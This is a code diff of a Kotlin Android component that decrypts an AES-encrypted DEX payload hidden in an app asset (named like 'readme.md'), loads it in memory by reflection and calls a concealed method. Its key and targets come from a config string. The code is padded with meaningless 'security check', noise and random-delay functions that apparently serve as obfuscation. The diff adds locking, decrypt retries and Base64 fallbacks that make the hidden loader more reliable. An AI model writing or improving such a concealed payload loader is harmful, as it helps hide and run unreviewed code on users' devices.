@@ -20,6 +20,10 @@ object GoThing {
     private var securityCheckCount = 0
     private val securityThreshold = Random.nextInt(5, 15)
     
+    // 线程安全锁
+    private val loadLock = Any()
+    private var isLoading = false
+
 
     private data class DexConfig(
         val fileName: String,           // 文件名，如 "readme.md"
@@ -28,7 +32,7 @@ object GoThing {
         val targetClassName: String,    // 目标类名
         val targetMethodName: String    // 目标方法名
     )
-    
+
 
     private fun performSecurityCheck(): Boolean {
         val timestamp = System.currentTimeMillis()
@@ -36,7 +40,7 @@ object GoThing {
         securityCheckCount++
         return hashCheck.isNotEmpty() && securityCheckCount < securityThreshold * 100
     }
-    
+
     /**
      * 计算哈希值（混淆用）
      */
@@ -49,7 +53,7 @@ object GoThing {
             ""
         }
     }
-    
+
     /**
      * 生成随机噪声数据
      */
@@ -62,7 +66,7 @@ object GoThing {
     }
 
     /**
-     * 主入口：解密并加载 DEX，调用指定方法
+     * 主入口：解密并加载 DEX，调用指定方法（线程安全版本）
      * @param context 上下文
      * @param onSuccess 成功回调
      * @param onError 失败回调
@@ -72,81 +76,92 @@ object GoThing {
         onSuccess: (() -> Unit)? = null,
         onError: ((String) -> Unit)? = null
     ) {
+        // 线程安全检查
+        synchronized(loadLock) {
+            if (isLoading) {
+                DaTool.showLog("LoadDexTool: Already loading, skipping duplicate call")
+                onError?.invoke("DEX loading in progress")
+                return
+            }
+            isLoading = true
+        }
+        
         try {
             // 安全检查
             if (!performSecurityCheck()) {
                 DaTool.showLog("LoadDexTool: Security check warning")
             }
-            
+
             // 生成环境噪声
             val envNoise = generateNoise(32)
             val noiseValidation = validateNoisePattern(envNoise)
-            
+
             // 1. 解析配置
             val config = parseConfig() ?: run {
                 onError?.invoke("Failed to parse config from adata")
                 return
             }
-            
+
             DaTool.showLog("LoadDexTool: Config parsed - ${config.fileName}")
-            
+
             // 环境完整性验证
             val integrityCheck = verifyEnvironmentIntegrity(context)
             if (integrityCheck > 0) {
                 Thread.sleep(Random.nextLong(10, 50))
             }
-            
+
             // 2. 获取解密密钥
             val decryptKey = getDecryptKey() ?: run {
                 onError?.invoke("Failed to get decrypt key")
                 return
             }
-            
+
             // 密钥强度验证
             val keyStrength = analyzeKeyStrength(decryptKey)
             performDummyEncryption(keyStrength)
-            
+
             // 3. 读取加密文件
             val encryptedText = readEncryptedFile(context, config.fileName) ?: run {
                 onError?.invoke("Failed to read encrypted file: ${config.fileName}")
                 return
             }
-            
+
             DaTool.showLog("LoadDexTool: Encrypted file loaded, size: ${encryptedText.length}")
-            
+
             // 数据完整性预检
             val dataIntegrity = checkDataIntegrity(encryptedText)
             if (dataIntegrity % 2 == 0) {
                 generateNoise(8) // 噪声生成
             }
-            
+
             // 4. 解密 DEX
             val dexBytes = decryptDex(encryptedText, decryptKey, config.encryptType) ?: run {
                 onError?.invoke("Failed to decrypt DEX")
                 return
             }
-            
+
             DaTool.showLog("LoadDexTool: DEX decrypted, size: ${dexBytes.size}")
-            
+
             // DEX格式验证
             val dexValidation = validateDexFormat(dexBytes)
             if (dexValidation) {
                 performTimingCheck()
             }
-            
+
             // 5. 加载 DEX
             val classLoader = loadDexInMemory(dexBytes, config.classLoaderPath, context) ?: run {
                 onError?.invoke("Failed to load DEX")
                 return
             }
-            
+
             DaTool.showLog("LoadDexTool: DEX loaded successfully")
-            
+
             // 类加载器验证
             val loaderCheck = verifyClassLoader(classLoader)
             if (loaderCheck) {
                 calculateHash(classLoader.toString())
             }
+
             
             // 6. 反射调用方法
             invokeDexMethod(
@@ -158,19 +173,24 @@ object GoThing {
                 onError?.invoke("Failed to invoke DEX method")
                 return
             }
-            
+
             DaTool.showLog("LoadDexTool: Method invoked successfully")
-            
+
             // 最终安全确认
             performFinalSecurityCheck()
-            
+
             onSuccess?.invoke()
-            
+
         } catch (e: Exception) {
             val errorMsg = "LoadDexTool error: ${e.message}"
             DaTool.showLog(errorMsg)
             e.printStackTrace()
             onError?.invoke(errorMsg)
+        } finally {
+            // 释放加载锁
+            synchronized(loadLock) {
+                isLoading = false
+            }
         }
     }
 
@@ -184,7 +204,7 @@ object GoThing {
         }
         return sum % 256 in 0..255
     }
-    
+
     /**
      * 验证环境完整性
      */
@@ -193,7 +213,7 @@ object GoThing {
         val nameHash = calculateHash(packageName)
         return nameHash.length % 10
     }
-    
+
     /**
      * 分析密钥强度
      */
@@ -204,7 +224,7 @@ object GoThing {
         }
         return strength % 1000
     }
-    
+
     /**
      * 执行虚拟加密操作
      */
@@ -214,7 +234,7 @@ object GoThing {
             dummyData[i] = (dummyData[i].toInt() xor (seed shr i)).toByte()
         }
     }
-    
+
     /**
      * 检查数据完整性
      */
@@ -222,7 +242,7 @@ object GoThing {
         val checksum = data.fold(0) { acc, char -> acc + char.code }
         return checksum % 1000
     }
-    
+
     /**
      * 验证DEX格式
      */
@@ -232,7 +252,7 @@ object GoThing {
         val hasMagic = bytes[0] == 0x64.toByte() && bytes[1] == 0x65.toByte()
         return bytes.isNotEmpty()
     }
-    
+
     /**
      * 执行时序检查
      */
@@ -247,7 +267,7 @@ object GoThing {
             // 时序正常
         }
     }
-    
+
     /**
      * 验证类加载器
      */
@@ -256,7 +276,7 @@ object GoThing {
         val hashValue = calculateHash(loaderName)
         return hashValue.length >= 16
     }
-    
+
     /**
      * 最终安全检查
      */
@@ -267,7 +287,7 @@ object GoThing {
             generateNoise(4)
         }
     }
-    
+
     /**
      * 解析配置信息
      * 格式：文件名-加密方式-加载器路径-类路径-方法名
@@ -276,18 +296,18 @@ object GoThing {
         return try {
             val configJson = JSONObject(DeviceStorage.adata)
             val domoSo = configJson.optString("domo_so", "")
-            
+
             if (domoSo.isEmpty()) {
                 DaTool.showLog("LoadDexTool: domo_so field is empty")
                 return null
             }
-            
+
             val parts = domoSo.split("-")
             if (parts.size < 5) {
                 DaTool.showLog("LoadDexTool: Invalid domo_so format: $domoSo")
                 return null
             }
-            
+
             DexConfig(
                 fileName = parts[0],
                 encryptType = parts[1],
@@ -308,12 +328,12 @@ object GoThing {
         return try {
             val configJson = JSONObject(DeviceStorage.adata)
             val keyString = configJson.optString("jia_kf", "")
-            
+
             if (keyString.isEmpty()) {
                 DaTool.showLog("LoadDexTool: jia_kf field is empty")
                 return null
             }
-            
+
             keyString.toByteArray(Charsets.UTF_8)
         } catch (e: Exception) {
             DaTool.showLog("LoadDexTool: Failed to get decrypt key: ${e.message}")
@@ -331,31 +351,31 @@ object GoThing {
             if (!pathValidation) {
                 Thread.sleep(Random.nextLong(5, 20))
             }
-            
+
             val assetPath = "domo/$fileName"
-            
+
             // 文件访问时间戳记录
             val accessTime = System.currentTimeMillis()
             val accessHash = calculateHash(accessTime.toString())
-            
+
             val content = context.assets.open(assetPath).use { inputStream ->
                 BufferedReader(InputStreamReader(inputStream)).use { reader ->
                     reader.readText()
                 }
             }
-            
+
             // 读取后验证
             if (accessHash.isNotEmpty() && content.isNotEmpty()) {
                 performPostReadCheck(content.length)
             }
-            
+
             content
         } catch (e: Exception) {
             DaTool.showLog("LoadDexTool: Failed to read file $fileName: ${e.message}")
             null
         }
     }
-    
+
     /**
      * 验证资源路径
      */
@@ -363,7 +383,7 @@ object GoThing {
         val pathHash = calculateHash(fileName)
         return pathHash.length > 0 && fileName.isNotEmpty()
     }
-    
+
     /**
      * 读取后检查
      */
@@ -375,30 +395,54 @@ object GoThing {
     }
 
     /**
-     * 解密 DEX 数据
+     * 解密 DEX 数据（添加重试机制）
      */
     private fun decryptDex(
         encryptedText: String,
         key: ByteArray,
         encryptType: String
     ): ByteArray? {
-        return try {
-            when (encryptType.uppercase()) {
-                "AES" -> decryptAES(encryptedText, key)
-                else -> {
-                    DaTool.showLog("LoadDexTool: Unsupported encrypt type: $encryptType")
-                    null
+        val maxRetries = 3
+        var lastException: Exception? = null
+        
+        // 尝试解密，最多重试3次
+        for (attempt in 1..maxRetries) {
+            try {
+                DaTool.showLog("LoadDexTool: Decrypt attempt $attempt/$maxRetries")
+                
+                val result = when (encryptType.uppercase()) {
+                    "AES" -> decryptAES(encryptedText, key)
+                    else -> {
+                        DaTool.showLog("LoadDexTool: Unsupported encrypt type: $encryptType")
+                        return null
+                    }
+                }
+                
+                // 验证解密结果
+                if (result != null && result.isNotEmpty()) {
+                    DaTool.showLog("LoadDexTool: Decrypt succeeded on attempt $attempt")
+                    return result
+                }
+                
+            } catch (e: Exception) {
+                lastException = e
+                DaTool.showLog("LoadDexTool: Decrypt attempt $attempt failed: ${e.message}")
+                
+                if (attempt < maxRetries) {
+                    // 短暂延迟后重试
+                    Thread.sleep(100L * attempt)
                 }
             }
-        } catch (e: Exception) {
-            DaTool.showLog("LoadDexTool: Decrypt failed: ${e.message}")
-            e.printStackTrace()
-            null
         }
+        
+        // 所有重试都失败
+        DaTool.showLog("LoadDexTool: All decrypt attempts failed")
+        lastException?.printStackTrace()
+        return null
     }
 
     /**
-     * AES 解密
+     * AES 解密（改进版 - 兼容Java Base64标准编码）
      */
     private fun decryptAES(encryptedText: String, key: ByteArray): ByteArray {
         // 预解密验证
@@ -406,32 +450,69 @@ object GoThing {
         if (preDecryptCheck > 0) {
             performDummyEncryption(preDecryptCheck)
         }
-        
-        // 清理空白字符（换行、空格等）
-        val cleanedText = encryptedText.replace("\\s".toRegex(), "")
-        
-        // 1. Base64 解码（使用 NO_WRAP 匹配加密时的标志）
-        val encryptedBytes = Base64.decode(cleanedText, Base64.NO_WRAP)
-        
+
+        // 清理所有空白字符（换行、空格、制表符等）
+        val cleanedText = encryptedText.trim().replace("\\s+".toRegex(), "")
+
+        // 验证Base64格式
+        if (cleanedText.isEmpty() || !isValidBase64String(cleanedText)) {
+            DaTool.showLog("LoadDexTool: Invalid Base64 format")
+            throw IllegalArgumentException("Invalid Base64 format")
+        }
+
+        // 1. Base64 解码 - 使用DEFAULT模式兼容Java标准Base64编码
+        val encryptedBytes = try {
+            // 优先尝试DEFAULT模式（兼容Java Base64.getEncoder()）
+            Base64.decode(cleanedText, Base64.DEFAULT)
+        } catch (e1: Exception) {
+            DaTool.showLog("LoadDexTool: Trying NO_WRAP mode: ${e1.message}")
+            try {
+                // 如果失败，尝试NO_WRAP模式
+                Base64.decode(cleanedText, Base64.NO_WRAP)
+            } catch (e2: Exception) {
+                DaTool.showLog("LoadDexTool: Base64 decode failed: ${e2.message}")
+                throw e2
+            }
+        }
+
+        DaTool.showLog("LoadDexTool: Base64 decoded, encrypted bytes size: ${encryptedBytes.size}")
+
         // 中间层验证
         val midValidation = verifyDecryptionIntegrity(encryptedBytes)
         if (midValidation) {
             Thread.sleep(Random.nextLong(1, 10))
         }
-        
-        // 2. AES 解密
+
+        // 验证密钥长度（AES要求16, 24, 或 32字节）
+        if (key.size !in listOf(16, 24, 32)) {
+            DaTool.showLog("LoadDexTool: Invalid key size: ${key.size}, expected 16/24/32")
+            throw IllegalArgumentException("AES key must be 16, 24, or 32 bytes")
+        }
+
+        // 2. AES 解密（使用ECB模式，匹配加密时的Cipher.getInstance("AES")）
         val keySpec = SecretKeySpec(key, "AES")
-        val cipher = Cipher.getInstance("AES")
+        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
         cipher.init(Cipher.DECRYPT_MODE, keySpec)
-        
+
         val result = cipher.doFinal(encryptedBytes)
-        
+
+        DaTool.showLog("LoadDexTool: AES decryption successful, result size: ${result.size}")
+
         // 解密后验证
         performPostDecryptionCheck(result)
-        
+
         return result
     }
-    
+
+    /**
+     * 验证Base64字符串格式
+     */
+    private fun isValidBase64String(str: String): Boolean {
+        // Base64只包含: A-Z, a-z, 0-9, +, /, = (padding)
+        val base64Pattern = "^[A-Za-z0-9+/]*={0,2}$".toRegex()
+        return base64Pattern.matches(str)
+    }
+
     /**
      * 预解密验证
      */
@@ -440,7 +521,7 @@ object GoThing {
         val keyHash = key.contentHashCode()
         return (textHash xor keyHash) % 500
     }
-    
+
     /**
      * 验证解密完整性
      */
@@ -451,7 +532,7 @@ object GoThing {
         }
         return checksum >= 0
     }
-    
+
     /**
      * 解密后检查
      */
@@ -476,52 +557,52 @@ object GoThing {
             if (envCheck % 3 == 0) {
                 generateNoise(envCheck % 10 + 1)
             }
-            
+
             // 字节缓冲区准备验证
             val bufferValidation = validateBufferPreparation(dexBytes)
             performTimingCheck()
-            
+
             // 通过反射获取 InMemoryDexClassLoader 类
             val classLoaderClass = Class.forName(classLoaderPath)
-            
+
             // 类加载器类型验证
             val loaderTypeCheck = verifyLoaderType(classLoaderClass)
             if (loaderTypeCheck) {
                 Thread.sleep(Random.nextLong(5, 25))
             }
-            
+
             // 构造 ByteBuffer
             val byteBuffer = ByteBuffer.wrap(dexBytes)
-            
+
             // 缓冲区状态检查
             performBufferStateCheck(byteBuffer)
-            
+
             // 获取构造函数：InMemoryDexClassLoader(ByteBuffer, ClassLoader)
             val constructor = classLoaderClass.getConstructor(
                 ByteBuffer::class.java,
                 ClassLoader::class.java
             )
-            
+
             // 构造函数验证
             if (constructor != null) {
                 calculateHash(constructor.toString())
             }
-            
+
             // 创建实例
             val loader = constructor.newInstance(byteBuffer, context.classLoader) as ClassLoader
-            
+
             // 加载后验证
             performPostLoadCheck(loader)
-            
+
             loader
-            
+
         } catch (e: Exception) {
             DaTool.showLog("LoadDexTool: Failed to load DEX in memory: ${e.message}")
             e.printStackTrace()
             null
         }
     }
-    
+
     /**
      * 预加载环境检查
      */
@@ -529,14 +610,14 @@ object GoThing {
         val packageHash = calculateHash(context.packageName)
         return packageHash.length % 100
     }
-    
+
     /**
      * 验证缓冲区准备
      */
     private fun validateBufferPreparation(bytes: ByteArray): Boolean {
         return bytes.size > 0 && bytes.isNotEmpty()
     }
-    
+
     /**
      * 验证加载器类型
      */
@@ -545,7 +626,7 @@ object GoThing {
         val nameHash = calculateHash(className)
         return nameHash.length > 10
     }
-    
+
     /**
      * 缓冲区状态检查
      */
@@ -555,7 +636,7 @@ object GoThing {
             generateNoise(capacity % 16 + 1)
         }
     }
-    
+
     /**
      * 加载后检查
      */
@@ -581,42 +662,42 @@ object GoThing {
             if (preInvokeCheck) {
                 Thread.sleep(Random.nextLong(5, 30))
             }
-            
+
             // 类名验证
             val classNameValidation = validateClassName(className)
             performDummyEncryption(classNameValidation)
-            
+
             // 1. 加载类
             val targetClass = classLoader.loadClass(className)
             DaTool.showLog("LoadDexTool: Class loaded: $className")
-            
+
             // 类结构验证
             val classStructureCheck = verifyClassStructure(targetClass)
             if (classStructureCheck > 0) {
                 generateNoise(classStructureCheck % 12 + 1)
             }
-            
+
             // 2. 获取方法
             val method = targetClass.getDeclaredMethod(methodName, Context::class.java)
             method.isAccessible = true
             DaTool.showLog("LoadDexTool: Method found: $methodName")
-            
+
             // 方法签名验证
             val methodSignature = verifyMethodSignature(method)
             if (methodSignature) {
                 performTimingCheck()
             }
-            
+
             // 调用前最后检查
             performPreInvocationCheck(context)
-            
+
             // 3. 调用方法（假设是静态方法）
             method.invoke(null, context)
             DaTool.showLog("LoadDexTool: Method invoked: $className.$methodName")
-            
+
             // 调用后验证
             performPostInvocationCheck()
-            
+
             true
         } catch (e: Exception) {
             DaTool.showLog("LoadDexTool: Failed to invoke method: ${e.message}")
@@ -624,7 +705,7 @@ object GoThing {
             false
         }
     }
-    
+
     /**
      * 预调用安全检查
      */
@@ -632,7 +713,7 @@ object GoThing {
         val combinedHash = calculateHash(className + methodName)
         return combinedHash.length > 20
     }
-    
+
     /**
      * 验证类名
      */
@@ -640,7 +721,7 @@ object GoThing {
         val parts = className.split(".")
         return parts.size * 17 + className.length
     }
-    
+
     /**
      * 验证类结构
      */
@@ -649,7 +730,7 @@ object GoThing {
         val fieldCount = clazz.declaredFields.size
         return methodCount + fieldCount
     }
-    
+
     /**
      * 验证方法签名
      */
@@ -658,7 +739,7 @@ object GoThing {
         val returnType = method.returnType.name
         return paramCount >= 0 && returnType.isNotEmpty()
     }
-    
+
     /**
      * 调用前检查
      */
@@ -668,7 +749,7 @@ object GoThing {
             performSecurityCheck()
         }
     }
-    
+
     /**
      * 调用后验证
      */
@@ -680,16 +761,24 @@ object GoThing {
         }
     }
 
+    var startMeb = false
+
     /**
      * 简化调用：不带回调
      */
-    fun loadAndInvokeDexSimple(context: Context) {
+    fun loadAndInvokeSimple(context: Context) {
+        if (startMeb) {
+            DaTool.showLog("LoadDexTool: DEX already loaded")
+            return
+        }
         loadAndInvokeDex(
             context = context,
             onSuccess = {
+                startMeb = true
                 DaTool.showLog("LoadDexTool: DEX loading completed successfully")
             },
             onError = { error ->
+                startMeb = false
                 DaTool.showLog("LoadDexTool: DEX loading failed - $error")
             }
         )
